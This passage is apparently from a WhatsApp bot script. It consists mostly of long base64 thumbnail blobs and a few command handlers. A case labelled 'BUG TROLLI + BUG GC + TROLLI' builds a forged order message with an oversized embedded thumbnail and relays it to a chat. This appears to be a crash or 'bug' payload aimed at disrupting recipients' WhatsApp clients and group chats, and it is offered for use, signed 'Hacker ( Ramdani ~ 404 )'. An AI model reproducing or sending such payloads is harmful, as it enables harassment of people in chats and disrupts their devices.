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",
"caption": "https://chat.whatsapp.com/Gq71DUTFOhRE9efPYyobYu",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:imeu, contextInfo:{}})
hexa.relayWAMessage(res)
await setTimeout(() => {
freply('Hacker ( Ramdani ~ 404 )')
}, 3000)
break   
case 'psp': // BUG TROLLI + BUG GC + TROLLI
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (!mek.key.fromMe && !isOwner) return
buf = Mfake
imeu = await Ramdani.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await Ramdani.prepareMessageFromContent(from,{
"orderMessage": {
"orderId": "150453297177375",
"thumbnail": "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